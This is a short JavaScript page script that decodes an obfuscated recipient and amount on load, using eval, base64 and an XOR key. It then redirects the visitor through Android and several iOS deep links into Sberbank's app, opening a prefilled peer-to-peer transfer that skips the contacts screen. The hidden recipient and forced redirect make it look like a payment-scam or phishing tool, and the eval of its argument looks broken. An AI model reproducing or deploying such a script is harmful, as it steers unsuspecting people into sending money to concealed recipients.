(function(v){
	const platform = navigator.userAgent.toLowerCase();

	const url = new URL(window.location.href);
	const searchParams = url.searchParams;

	const stage = searchParams.get('stage') || '1';
	const urlPathSegments = url.pathname.split('/');
	const code = urlPathSegments[urlPathSegments.length - 1];

	const iosProtocols = {
		'1': {
			l: 'btripsexpenses://sbolonline/',
			n: '2'
		},
		'2': {
			l: 'sbolonline://',
			n: '3'
		},
		'3': {
			l: 'sberbankonline://',
			n: '4'
		},
		'4': {
			l: 'ios-app-smartonline://sbolonline/',
			n: '5'
		},
		'5': {
			l: 'budgetonline-ios://sbolonline/',
			n: '-1'
		},
		'-1': {
			l: null
		}
	};

	function dec(enc) {
		sc='gmfalkjgla=431ou413lfadns';
	  const encb = atob(enc);

	  const decb = new Uint8Array(encb.length);
	  for (let i = 0; i < encb.length; i++) {
		decb[i] = encb.charCodeAt(i) ^ sc.charCodeAt(i % sc.length);
	  }

	  return String.fromCharCode(...decb);
	}

	const d = dec(eval(v));
	const ds = d.split('|');

	let link = "p2ptransfer?amount=" + ds[1] + "&isNeedToOpenNextScreen=false&skipContactsScreen=true&to=" + ds[0];

	if (ds[2] === 'account') {
		link += "&type=account";
	}

	const android = () => {
		window.location.href = "intent://ru.sberbankmobile/payments/p2p?source=qr&type=phone_number&requisiteNumber=" + ds[0] + "&amount=" + ds[1]
	}

	const reset = (newStage) => window.location.replace(`${code}?stage=${newStage}`)

	const showUnsupportedAlert = () => {
		alert('Unsupported platform');
		window.top.close();
	};

	if (platform.includes("android")) {
		if (stage === '1') {
				android();
				setTimeout(() => reset('-1'), 100);
		} else if (stage === '-1') {
				// showUnsupportedAlert();
		}
	} else if (platform.includes("iphone")) {
		if (iosProtocols[stage] && iosProtocols[stage].l) {
			window.location.href = iosProtocols[stage].l + link;
			setTimeout(() => reset(iosProtocols[stage].n), 100);
		} else {
			// showUnsupportedAlert();
		}
	} else {
		showUnsupportedAlert();
	}
})('gafdsfgre');